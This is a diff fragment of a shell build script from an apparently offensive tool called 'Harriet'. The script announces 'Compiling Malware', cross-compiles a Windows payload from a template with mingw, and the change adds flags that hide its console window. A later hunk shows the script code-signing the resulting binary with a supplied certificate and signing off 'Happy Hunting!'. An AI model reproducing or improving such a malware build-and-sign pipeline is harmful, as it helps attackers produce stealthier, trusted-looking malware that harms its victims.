@@ -150,7 +150,7 @@ rm proc*
 
 #Compiling Malware
 echo -e ${yellow}"+++Compiling Malware+++"${clear}
-x86_64-w64-mingw32-g++ -o $MALWARE Harriet/FULLInj/Resources/template.cpp -fpermissive -Wno-narrowing -O3 -O2>/dev/null 2>&1
+x86_64-w64-mingw32-g++ -o $MALWARE Harriet/FULLInj/Resources/template.cpp -fpermissive -Wno-narrowing Harriet/Resources/resources.res -mwindows -lntdll -O2 -Os>/dev/null 2>&1
 echo ""
 sleep 2
 rm shell*
@@ -189,7 +189,4 @@ osslsigncode sign -certs "$CERTIFICATE_PATH" -key "$KEY_PATH" -in "$MALWARE" -ou
 mv signed$MALWARE $MALWARE
 echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
 echo ""
-
-
-
 
